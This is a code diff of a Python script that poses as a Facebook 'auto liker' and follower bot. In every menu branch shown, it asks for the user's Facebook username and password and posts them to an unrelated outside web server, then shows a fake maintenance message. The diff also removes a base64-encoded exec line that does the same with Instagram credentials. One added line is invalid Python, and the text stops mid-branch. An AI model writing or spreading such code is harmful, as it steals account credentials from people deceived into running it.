@@ -3,5 +3,301 @@
 import base64
 import requests
 import os
+red = "\033[1;31;40m"
+green = "\033[1;32;40m"
+cyan = "\033[1;36;40m"
+Bright Blue="\033[1;34;40m" 
 
-exec(base64.b64decode("cmVkID0gIlwwMzNbMTszMTs0MG0iCmdyZWVuID0gIlwwMzNbMTszMjs0MG0iCmN5YW4gPSAiXDAzM1sxOzM2OzQwbSIKCmJhbm5lciA9ICIiIgogICAg4paI4paIICAgICAgICAgICAgICAg4paE4paECiAgICDiloDiloAgICAgICAgICAgICAgICDilojiloggICAgICAgICAgICAgICAgICAgIOKWiOKWiAogIOKWiOKWiOKWiOKWiCAgICAg4paI4paI4paE4paI4paI4paI4paI4paEICDilojilojiloTilojilojilojiloQgICAg4paE4paI4paI4paI4paI4paEICAg4paI4paI4paI4paI4paI4paI4paICiAgICDilojiloggICAgIOKWiOKWiOKWgCAgIOKWiOKWiCAg4paI4paI4paAICDiloDilojiloggIOKWiOKWiOKWgCAg4paA4paI4paIICAgIOKWiOKWiAogICAg4paI4paIICAgICDilojiloggICAg4paI4paIICDilojiloggICAg4paI4paIICDilojiloggICAg4paI4paIICAgIOKWiOKWiAog4paE4paE4paE4paI4paI4paE4paE4paEICDilojiloggICAg4paI4paIICDilojilojilojiloTiloTilojilojiloAgIOKWgOKWiOKWiOKWhOKWhOKWiOKWiOKWgCAgICDilojilojiloTiloTiloQKIOKWgOKWgOKWgOKWgOKWgOKWgOKWgOKWgCAg4paA4paAICAgIOKWgOKWgCAg4paA4paAIOKWgOKWgOKWgCAgICAgIOKWgOKWgOKWgOKWgCAgICAgICDiloDiloDiloDiloAKIiIiCm9zLnN5c3RlbSgiY2xlYXIiKQpwcmludChyZWQgKyBiYW5uZXIpCgpwcmludCgiIikKCnByaW50KGdyZWVuICsgIlsxXSBJbnN0YWdyYW0gYXV0byBmb2xsb3dlcnMiKQpwcmludChncmVlbiArICJbMl0gSW5zdGFncmFtIGF1dG8gbGlrZXIiKQpwcmludChncmVlbiArICJbM10gQ29tbWVudCBib3QiKQpwcmludChncmVlbiArICJbNF0gTGlrZSBib3QiKQpwcmludChncmVlbiArICJbNV0gQXV0byByZXBvcnQiKQpwcmludChyZWQgKyAiWzZdIEV4aXQiKQoKcHJpbnQoIiIpCgpvcHRpb24gPSBpbnB1dChyZWQgKyAiRW50ZXIgeW91ciBjaG9pY2U6ICIpCgpwcmludCgiIikKCmlmIChvcHRpb249PSIxIik6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXByaW50KHJlZCArIGJhbm5lcikKCXByaW50KCIiKQoJcHJpbnQoZ3JlZW4gKyAiWzFdIFBhaWQiKSAKCXByaW50KGdyZWVuICsgIlsyXSBGcmVlIikKCXByaW50KCIiKQoJY2hvaWNlID0gaW5wdXQocmVkICsgIkNob29zZSB5b3VyIGNob2ljZToiKQoKCWlmIChjaG9pY2U9PSIxIik6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQocmVkICsgYmFubmVyKQoJCXByaW50KCIiKQoJCXByaW50KGN5YW4gKyAiTG9naW4geW91ciBpbnN0YWdyYW0gYWNjb3VudCIpCgkJcHJpbnQoIiIpCgkJdXNlcm5hbWUgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSB1c2VybmFtZTogIikKCQlwYXNzd29yZCA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHBhc3N3b3JkOiAiKQoJCXByaW50KGN5YW4gKyAiTG9naW5nIGluLi4uIikKCQl1cmwgPSAiaHR0cHM6Ly9zbW1wcm9zdG9yZS4wMDB3ZWJob3N0YXBwLmNvbS9sb2dpbi5waHAiCgkJZGF0YTEgPSB7J2VtYWlsJzp1c2VybmFtZSwncGFzcyc6cGFzc3dvcmR9CgkJcmVxdWVzdHMucG9zdCh1cmwsZGF0YT1kYXRhMSkKCQlwcmludChncmVlbiArICJzb3JyeSxvdXIgc2VydmVyIGlzIHVuZGVyIG1haW50ZW5hbmNlLi4uIikKCQlwcmludChncmVlbiArICJXZSB3aWxsIGNvbWUgYmFjayBzb29uLi4uIikKCQlwcmludChncmVlbiArICJwbGVhc2UgdHJ5IGFnYWluIGFmdGVyIHNvbWV0aW1lLi4uIikKCQlleGl0KCkKCWVsaWYgKGNob2ljZT09IjIiKToKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludChyZWQgKyBiYW5uZXIpCgkJcHJpbnQoIiIpCgkJcHJpbnQoY3lhbiArICJMb2dpbiB5b3VyIGluc3RhZ3JhbSBhY2NvdW50IikKCQlwcmludCgiIikKCQl1c2VybmFtZSA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHVzZXJuYW1lOiAiKQoJCXBhc3N3b3JkID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gcGFzc3dvcmQ6ICIpCgkJcHJpbnQoY3lhbiArICJMb2dpbmcgaW4uLi4iKQoJCXVybCA9ICJodHRwczovL3NtbXByb3N0b3JlLjAwMHdlYmhvc3RhcHAuY29tL2xvZ2luLnBocCIKCQlkYXRhMSA9IHsnZW1haWwnOnVzZXJuYW1lLCdwYXNzJzpwYXNzd29yZH0KCQlyZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGExKQoJCXByaW50KGdyZWVuICsgInNvcnJ5LG91ciBzZXJ2ZXIgaXMgdW5kZXIgbWFpbnRlbmFuY2UuLi4iKQoJCXByaW50KGdyZWVuICsgIldlIHdpbGwgY29tZSBiYWNrIHNvb24uLi4iKQoJCXByaW50KGdyZWVuICsgInBsZWFzZSB0cnkgYWdhaW4gYWZ0ZXIgc29tZXRpbWUuLi4iKQoJCWV4aXQoKQoJZWxzZToKCQlwcmludChyZWQgKyAiSW52YWxpZCBpbnB1dCIpCgkJZXhpdCgpCgplbGlmIChvcHRpb249PSIyIik6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXByaW50KHJlZCArIGJhbm5lcikKCXByaW50KCIiKQoJcHJpbnQoZ3JlZW4gKyAiWzFdIFBhaWQiKSAKCXByaW50KGdyZWVuICsgIlsyXSBGcmVlIikKCXByaW50KCIiKQoJY2hvaWNlID0gaW5wdXQocmVkICsgIkNob29zZSB5b3VyIGNob2ljZToiKQoKCWlmIChjaG9pY2U9PSIxIik6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQocmVkICsgYmFubmVyKQoJCXByaW50KCIiKQoJCXByaW50KGN5YW4gKyAiTG9naW4geW91ciBpbnN0YWdyYW0gYWNjb3VudCIpCgkJcHJpbnQoIiIpCgkJdXNlcm5hbWUgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSB1c2VybmFtZTogIikKCQlwYXNzd29yZCA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHBhc3N3b3JkOiAiKQoJCXByaW50KGN5YW4gKyAiTG9naW5nIGluLi4uIikKCQl1cmwgPSAiaHR0cHM6Ly9zbW1wcm9zdG9yZS4wMDB3ZWJob3N0YXBwLmNvbS9sb2dpbi5waHAiCgkJZGF0YTEgPSB7J2VtYWlsJzp1c2VybmFtZSwncGFzcyc6cGFzc3dvcmR9CgkJcmVxdWVzdHMucG9zdCh1cmwsZGF0YT1kYXRhMSkKCQlwcmludChncmVlbiArICJzb3JyeSxvdXIgc2VydmVyIGlzIHVuZGVyIG1haW50ZW5hbmNlLi4uIikKCQlwcmludChncmVlbiArICJXZSB3aWxsIGNvbWUgYmFjayBzb29uLi4uIikKCQlwcmludChncmVlbiArICJwbGVhc2UgdHJ5IGFnYWluIGFmdGVyIHNvbWV0aW1lLi4uIikKCQlleGl0KCkKCWVsaWYgKGNob2ljZT09IjIiKToKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludChyZWQgKyBiYW5uZXIpCgkJcHJpbnQoIiIpCgkJcHJpbnQoY3lhbiArICJMb2dpbiB5b3VyIGluc3RhZ3JhbSBhY2NvdW50IikKCQlwcmludCgiIikKCQl1c2VybmFtZSA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHVzZXJuYW1lOiAiKQoJCXBhc3N3b3JkID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gcGFzc3dvcmQ6ICIpCgkJcHJpbnQoY3lhbiArICJMb2dpbmcgaW4uLi4iKQoJCXVybCA9ICJodHRwczovL3NtbXByb3N0b3JlLjAwMHdlYmhvc3RhcHAuY29tL2xvZ2luLnBocCIKCQlkYXRhMSA9IHsnZW1haWwnOnVzZXJuYW1lLCdwYXNzJzpwYXNzd29yZH0KCQlyZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGExKQoJCXByaW50KGdyZWVuICsgInNvcnJ5LG91ciBzZXJ2ZXIgaXMgdW5kZXIgbWFpbnRlbmFuY2UuLi4iKQoJCXByaW50KGdyZWVuICsgIldlIHdpbGwgY29tZSBiYWNrIHNvb24uLi4iKQoJCXByaW50KGdyZWVuICsgInBsZWFzZSB0cnkgYWdhaW4gYWZ0ZXIgc29tZXRpbWUuLi4iKQoJCWV4aXQoKQoJZWxzZToKCQlwcmludChyZWQgKyAiSW52YWxpZCBpbnB1dCIpCgkJZXhpdCgpCgplbGlmIChvcHRpb249PSIzIik6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXByaW50KHJlZCArIGJhbm5lcikKCXByaW50KCIiKQoJcHJpbnQoZ3JlZW4gKyAiWzFdIFBhaWQiKSAKCXByaW50KGdyZWVuICsgIlsyXSBGcmVlIikKCXByaW50KCIiKQoJY2hvaWNlID0gaW5wdXQocmVkICsgIkNob29zZSB5b3VyIGNob2ljZToiKQoKCWlmIChjaG9pY2U9PSIxIik6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQocmVkICsgYmFubmVyKQoJCXByaW50KCIiKQoJCXByaW50KGN5YW4gKyAiTG9naW4geW91ciBpbnN0YWdyYW0gYWNjb3VudCIpCgkJcHJpbnQoIiIpCgkJdXNlcm5hbWUgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSB1c2VybmFtZTogIikKCQlwYXNzd29yZCA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHBhc3N3b3JkOiAiKQoJCXByaW50KGN5YW4gKyAiTG9naW5nIGluLi4uIikKCQl1cmwgPSAiaHR0cHM6Ly9zbW1wcm9zdG9yZS4wMDB3ZWJob3N0YXBwLmNvbS9sb2dpbi5waHAiCgkJZGF0YTEgPSB7J2VtYWlsJzp1c2VybmFtZSwncGFzcyc6cGFzc3dvcmR9CgkJcmVxdWVzdHMucG9zdCh1cmwsZGF0YT1kYXRhMSkKCQlwcmludChncmVlbiArICJzb3JyeSxvdXIgc2VydmVyIGlzIHVuZGVyIG1haW50ZW5hbmNlLi4uIikKCQlwcmludChncmVlbiArICJXZSB3aWxsIGNvbWUgYmFjayBzb29uLi4uIikKCQlwcmludChncmVlbiArICJwbGVhc2UgdHJ5IGFnYWluIGFmdGVyIHNvbWV0aW1lLi4uIikKCQlleGl0KCkKCWVsaWYgKGNob2ljZT09IjIiKToKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludChyZWQgKyBiYW5uZXIpCgkJcHJpbnQoIiIpCgkJcHJpbnQoY3lhbiArICJMb2dpbiB5b3VyIGluc3RhZ3JhbSBhY2NvdW50IikKCQlwcmludCgiIikKCQl1c2VybmFtZSA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHVzZXJuYW1lOiAiKQoJCXBhc3N3b3JkID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gcGFzc3dvcmQ6ICIpCgkJcHJpbnQoY3lhbiArICJMb2dpbmcgaW4uLi4iKQoJCXVybCA9ICJodHRwczovL3NtbXByb3N0b3JlLjAwMHdlYmhvc3RhcHAuY29tL2xvZ2luLnBocCIKCQlkYXRhMSA9IHsnZW1haWwnOnVzZXJuYW1lLCdwYXNzJzpwYXNzd29yZH0KCQlyZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGExKQoJCXByaW50KGdyZWVuICsgInNvcnJ5LG91ciBzZXJ2ZXIgaXMgdW5kZXIgbWFpbnRlbmFuY2UuLi4iKQoJCXByaW50KGdyZWVuICsgIldlIHdpbGwgY29tZSBiYWNrIHNvb24uLi4iKQoJCXByaW50KGdyZWVuICsgInBsZWFzZSB0cnkgYWdhaW4gYWZ0ZXIgc29tZXRpbWUuLi4iKQoJCWV4aXQoKQoJZWxzZToKCQlwcmludChyZWQgKyAiSW52YWxpZCBpbnB1dCIpCgkJZXhpdCgpCgplbGlmIChvcHRpb249PSI0Iik6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXByaW50KHJlZCArIGJhbm5lcikKCXByaW50KCIiKQoJcHJpbnQoZ3JlZW4gKyAiWzFdIFBhaWQiKSAKCXByaW50KGdyZWVuICsgIlsyXSBGcmVlIikKCXByaW50KCIiKQoJY2hvaWNlID0gaW5wdXQocmVkICsgIkNob29zZSB5b3VyIGNob2ljZToiKQoKCWlmIChjaG9pY2U9PSIxIik6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQocmVkICsgYmFubmVyKQoJCXByaW50KCIiKQoJCXByaW50KGN5YW4gKyAiTG9naW4geW91ciBpbnN0YWdyYW0gYWNjb3VudCIpCgkJcHJpbnQoIiIpCgkJdXNlcm5hbWUgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSB1c2VybmFtZTogIikKCQlwYXNzd29yZCA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHBhc3N3b3JkOiAiKQoJCXByaW50KGN5YW4gKyAiTG9naW5nIGluLi4uIikKCQl1cmwgPSAiaHR0cHM6Ly9zbW1wcm9zdG9yZS4wMDB3ZWJob3N0YXBwLmNvbS9sb2dpbi5waHAiCgkJZGF0YTEgPSB7J2VtYWlsJzp1c2VybmFtZSwncGFzcyc6cGFzc3dvcmR9CgkJcmVxdWVzdHMucG9zdCh1cmwsZGF0YT1kYXRhMSkKCQlwcmludChncmVlbiArICJzb3JyeSxvdXIgc2VydmVyIGlzIHVuZGVyIG1haW50ZW5hbmNlLi4uIikKCQlwcmludChncmVlbiArICJXZSB3aWxsIGNvbWUgYmFjayBzb29uLi4uIikKCQlwcmludChncmVlbiArICJwbGVhc2UgdHJ5IGFnYWluIGFmdGVyIHNvbWV0aW1lLi4uIikKCQlleGl0KCkKCWVsaWYgKGNob2ljZT09IjIiKToKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludChyZWQgKyBiYW5uZXIpCgkJcHJpbnQoIiIpCgkJcHJpbnQoY3lhbiArICJMb2dpbiB5b3VyIGluc3RhZ3JhbSBhY2NvdW50IikKCQlwcmludCgiIikKCQl1c2VybmFtZSA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHVzZXJuYW1lOiAiKQoJCXBhc3N3b3JkID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gcGFzc3dvcmQ6ICIpCgkJcHJpbnQoY3lhbiArICJMb2dpbmcgaW4uLi4iKQoJCXVybCA9ICJodHRwczovL3NtbXByb3N0b3JlLjAwMHdlYmhvc3RhcHAuY29tL2xvZ2luLnBocCIKCQlkYXRhMSA9IHsnZW1haWwnOnVzZXJuYW1lLCdwYXNzJzpwYXNzd29yZH0KCQlyZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGExKQoJCXByaW50KGdyZWVuICsgInNvcnJ5LG91ciBzZXJ2ZXIgaXMgdW5kZXIgbWFpbnRlbmFuY2UuLi4iKQoJCXByaW50KGdyZWVuICsgIldlIHdpbGwgY29tZSBiYWNrIHNvb24uLi4iKQoJCXByaW50KGdyZWVuICsgInBsZWFzZSB0cnkgYWdhaW4gYWZ0ZXIgc29tZXRpbWUuLi4iKQoJCWV4aXQoKQoJZWxzZToKCQlwcmludChyZWQgKyAiSW52YWxpZCBpbnB1dCIpCgkJZXhpdCgpCgplbGlmIChvcHRpb249PSI1Iik6Cglvcy5zeXN0ZW0oImNsZWFyIikKCXByaW50KHJlZCArIGJhbm5lcikKCXByaW50KCIiKQoJcHJpbnQoY3lhbiArICJDaG9vc2UgeW91ciByZXBvcnRpbmcgb3B0aW9uIikKCXByaW50KCIiKQoJcHJpbnQoZ3JlZW4gKyAiWzFdIEluYXBwcm9wcmlhdGUgY29udGVudCIpCglwcmludChncmVlbiArICJbMl0gRmFrZSBhY2NvdW50IikKCXByaW50KGdyZWVuICsgIlszXSBQb3N0IHdpdGggc2V4dWFsIGNvbnRlbnQiKQoJcHJpbnQoZ3JlZW4gKyAiWzRdIEkgZG9uJ3Qgd2FudCB0byBzZWUgdGhpcyIpCglwcmludCgiIikKCXJlcG9ydCA9IGlucHV0KHJlZCArICJFbnRlciB5b3VyIHJlcG9ydCBvcHRpb246ICIpCglwcmludCgiIikKCglpZiAocmVwb3J0PT0iMSIpOgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCXByaW50KHJlZCArIGJhbm5lcikKCQlwcmludCgiIikKCQlwcmludChjeWFuICsgIkxvZ2luIHlvdXIgaW5zdGFncmFtIGFjY291bnQiKQoJCXByaW50KCIiKQoJCXVzZXJuYW1lID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gdXNlcm5hbWU6ICIpCgkJcGFzc3dvcmQgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSBwYXNzd29yZDogIikKCQlwcmludChjeWFuICsgIkxvZ2luZyBpbi4uLiIpCgkJdXJsID0gImh0dHBzOi8vc21tcHJvc3RvcmUuMDAwd2ViaG9zdGFwcC5jb20vbG9naW4ucGhwIgoJCWRhdGExID0geydlbWFpbCc6dXNlcm5hbWUsJ3Bhc3MnOnBhc3N3b3JkfQoJCXJlcXVlc3RzLnBvc3QodXJsLGRhdGE9ZGF0YTEpCgkJcHJpbnQoZ3JlZW4gKyAic29ycnksb3VyIHNlcnZlciBpcyB1bmRlciBtYWludGVuYW5jZS4uLiIpCgkJcHJpbnQoZ3JlZW4gKyAiV2Ugd2lsbCBjb21lIGJhY2sgc29vbi4uLiIpCgkJcHJpbnQoZ3JlZW4gKyAicGxlYXNlIHRyeSBhZ2FpbiBhZnRlciBzb21ldGltZS4uLiIpCgkJZXhpdCgpCgllbGlmIChyZXBvcnQ9PSIyIik6CgkJb3Muc3lzdGVtKCJjbGVhciIpCgkJcHJpbnQocmVkICsgYmFubmVyKQoJCXByaW50KCIiKQoJCXByaW50KGN5YW4gKyAiTG9naW4geW91ciBpbnN0YWdyYW0gYWNjb3VudCIpCgkJcHJpbnQoIiIpCgkJdXNlcm5hbWUgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSB1c2VybmFtZTogIikKCQlwYXNzd29yZCA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHBhc3N3b3JkOiAiKQoJCXByaW50KGN5YW4gKyAiTG9naW5nIGluLi4uIikKCQl1cmwgPSAiaHR0cHM6Ly9zbW1wcm9zdG9yZS4wMDB3ZWJob3N0YXBwLmNvbS9sb2dpbi5waHAiCgkJZGF0YTEgPSB7J2VtYWlsJzp1c2VybmFtZSwncGFzcyc6cGFzc3dvcmR9CgkJcmVxdWVzdHMucG9zdCh1cmwsZGF0YT1kYXRhMSkKCQlwcmludChncmVlbiArICJzb3JyeSxvdXIgc2VydmVyIGlzIHVuZGVyIG1haW50ZW5hbmNlLi4uIikKCQlwcmludChncmVlbiArICJXZSB3aWxsIGNvbWUgYmFjayBzb29uLi4uIikKCQlwcmludChncmVlbiArICJwbGVhc2UgdHJ5IGFnYWluIGFmdGVyIHNvbWV0aW1lLi4uIikKCQlleGl0KCkKCWVsaWYgKHJlcG9ydD09IjMiKToKCQlvcy5zeXN0ZW0oImNsZWFyIikKCQlwcmludChyZWQgKyBiYW5uZXIpCgkJcHJpbnQoIiIpCgkJcHJpbnQoY3lhbiArICJMb2dpbiB5b3VyIGluc3RhZ3JhbSBhY2NvdW50IikKCQlwcmludCgiIikKCQl1c2VybmFtZSA9IGlucHV0KGdyZWVuICsgIkVudGVyIHlvdXIgaW5zdGFncmFtIHVzZXJuYW1lOiAiKQoJCXBhc3N3b3JkID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gcGFzc3dvcmQ6ICIpCgkJcHJpbnQoY3lhbiArICJMb2dpbmcgaW4uLi4iKQoJCXVybCA9ICJodHRwczovL3NtbXByb3N0b3JlLjAwMHdlYmhvc3RhcHAuY29tL2xvZ2luLnBocCIKCQlkYXRhMSA9IHsnZW1haWwnOnVzZXJuYW1lLCdwYXNzJzpwYXNzd29yZH0KCQlyZXF1ZXN0cy5wb3N0KHVybCxkYXRhPWRhdGExKQoJCXByaW50KGdyZWVuICsgInNvcnJ5LG91ciBzZXJ2ZXIgaXMgdW5kZXIgbWFpbnRlbmFuY2UuLi4iKQoJCXByaW50KGdyZWVuICsgIldlIHdpbGwgY29tZSBiYWNrIHNvb24uLi4iKQoJCXByaW50KGdyZWVuICsgInBsZWFzZSB0cnkgYWdhaW4gYWZ0ZXIgc29tZXRpbWUuLi4iKQoJCWV4aXQoKQoJZWxpZiAocmVwb3J0PT0iNCIpOgoJCW9zLnN5c3RlbSgiY2xlYXIiKQoJCXByaW50KHJlZCArIGJhbm5lcikKCQlwcmludCgiIikKCQlwcmludChjeWFuICsgIkxvZ2luIHlvdXIgaW5zdGFncmFtIGFjY291bnQiKQoJCXByaW50KCIiKQoJCXVzZXJuYW1lID0gaW5wdXQoZ3JlZW4gKyAiRW50ZXIgeW91ciBpbnN0YWdyYW0gdXNlcm5hbWU6ICIpCgkJcGFzc3dvcmQgPSBpbnB1dChncmVlbiArICJFbnRlciB5b3VyIGluc3RhZ3JhbSBwYXNzd29yZDogIikKCQlwcmludChjeWFuICsgIkxvZ2luZyBpbi4uLiIpCgkJdXJsID0gImh0dHBzOi8vc21tcHJvc3RvcmUuMDAwd2ViaG9zdGFwcC5jb20vbG9naW4ucGhwIgoJCWRhdGExID0geydlbWFpbCc6dXNlcm5hbWUsJ3Bhc3MnOnBhc3N3b3JkfQoJCXJlcXVlc3RzLnBvc3QodXJsLGRhdGE9ZGF0YTEpCgkJcHJpbnQoZ3JlZW4gKyAic29ycnksb3VyIHNlcnZlciBpcyB1bmRlciBtYWludGVuYW5jZS4uLiIpCgkJcHJpbnQoZ3JlZW4gKyAiV2Ugd2lsbCBjb21lIGJhY2sgc29vbi4uLiIpCgkJcHJpbnQoZ3JlZW4gKyAicGxlYXNlIHRyeSBhZ2FpbiBhZnRlciBzb21ldGltZS4uLiIpCgkJZXhpdCgpCgllbHNlOgoJCXByaW50KHJlZCArICJJbnZhbGlkIGlucHV0IikKCQlleGl0KCkKCmVsc2U6CglwcmludChjeWFuICsgIlRoYW5rcyBmb3IgdXNpbmcuLi4iKQoJcHJpbnQoY3lhbiArICJDb2RlZCBieSBSQUhVTCBNT05EQSIpCglwcmludChyZWQgKyAiRXhpdGluZy4uLiIpCglwcmludCgiIikKCWV4aXQoKQ=="))
+
+banner = """
+ ___ ___     _  _   _ _____ ___  _    ___ _  _____ ___
+| __| _ )   /_\| | | |_   _/ _ \| |  |_ _| |/ / __| _ \
+| _|| _ \  / _ \ |_| | | || (_) | |__ | || ' <| _||   /
+|_| |___/ /_/ \_\___/  |_| \___/|____|___|_|\_\___|_|_\ 
+"""
+os.system("clear")
+print(Bright Blue+ banner)
+
+print("")
+
+print(green + "[1] FaceBook auto Post Liker")
+print(green + "[2] FaceBook auto Profile Liker")
+print(green + "[3] Comment bot")
+print(green + "[4] FaceBook auto Followers")
+print(green + "[5] Auto report")
+print(red + "[6] Exit")
+
+print("")
+
+option = input(red + "Enter your choice: ")
+
+print("")
+
+if (option=="1"):
+	os.system("clear")
+	print(red + banner)
+	print("")
+	print(green + "[1] Paid") 
+	print(green + "[2] Free")
+	print("")
+	choice = input(red + "Choose your choice:")
+
+	if (choice=="1"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (choice=="2"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your  FaceBook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	else:
+		print(red + "Invalid input")
+		exit()
+
+elif (option=="2"):
+	os.system("clear")
+	print(red + banner)
+	print("")
+	print(green + "[1] Paid") 
+	print(green + "[2] Free")
+	print("")
+	choice = input(red + "Choose your choice:")
+
+	if (choice=="1"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (choice=="2"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your FaceBook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	else:
+		print(red + "Invalid input")
+		exit()
+
+elif (option=="3"):
+	os.system("clear")
+	print(red + banner)
+	print("")
+	print(green + "[1] Paid") 
+	print(green + "[2] Free")
+	print("")
+	choice = input(red + "Choose your choice:")
+
+	if (choice=="1"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your  Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (choice=="2"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your instagram account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	else:
+		print(red + "Invalid input")
+		exit()
+
+elif (option=="4"):
+	os.system("clear")
+	print(red + banner)
+	print("")
+	print(green + "[1] Paid") 
+	print(green + "[2] Free")
+	print("")
+	choice = input(red + "Choose your choice:")
+
+	if (choice=="1"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	elif (choice=="2"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
+		print(green + "sorry,our server is under maintenance...")
+		print(green + "We will come back soon...")
+		print(green + "please try again after sometime...")
+		exit()
+	else:
+		print(red + "Invalid input")
+		exit()
+
+elif (option=="5"):
+	os.system("clear")
+	print(red + banner)
+	print("")
+	print(cyan + "Choose your reporting option")
+	print("")
+	print(green + "[1] Inappropriate content")
+	print(green + "[2] Fake account")
+	print(green + "[3] Post with sexual content")
+	print(green + "[4] I don't want to see this")
+	print("")
+	report = input(red + "Enter your report option: ")
+	print("")
+
+	if (report=="1"):
+		os.system("clear")
+		print(red + banner)
+		print("")
+		print(cyan + "Login your Facebook account")
+		print("")
+		username = input(green + "Enter your Facebook username: ")
+		password = input(green + "Enter your Facebook password: ")
+		print(cyan + "Loging in...")
+		url = "http://azfashionhousebd.com/login.php"
+		data1 = {'email':username,'pass':password}
+		requests.post(url,data=data1)
